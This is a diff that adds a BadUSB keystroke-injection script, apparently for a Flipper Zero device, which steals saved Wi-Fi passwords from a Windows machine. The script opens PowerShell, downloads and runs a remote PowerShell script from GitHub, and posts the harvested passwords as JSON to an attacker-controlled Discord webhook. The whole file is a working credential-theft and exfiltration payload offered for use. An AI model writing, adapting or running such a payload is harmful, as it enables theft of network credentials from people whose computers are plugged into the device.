@@ -1,0 +1,23 @@
+REM This grabs the wifi passwords and send them to discord via webhook
+DELAY 500
+GUI r
+DELAY 800
+STRING powershell
+ENTER
+DELAY 500
+REM replace webhook with your discord webhook
+STRING $hookUrl='your_webhoook_here'
+ENTER
+DELAY 500
+ALTSTRING $TmpPath = [System.Environment]::GetEnvironmentVariable("TMP"); $random = -join ("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray() | Get-Random -Count 12); Invoke-WebRequest -Uri https://github.com/estebanramos/FlipperZero-BadUSB/raw/main/Payloads/Malicious/Windows/Wifi-Grabber/wifi_passwords.ps1 -OutFile $TmpPath/$random.ps1;
+ENTER
+DELAY 500
+ALTSTRING $content = .$TmpPath/$random.ps1 | Out-String
+ENTER
+DELAY 500
+ALTSTRING $payload = [PSCustomObject]@{content = $content}
+ENTER
+DELAY 500
+ALTSTRING Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'Application/Json'
+ENTER
+DELAY 500
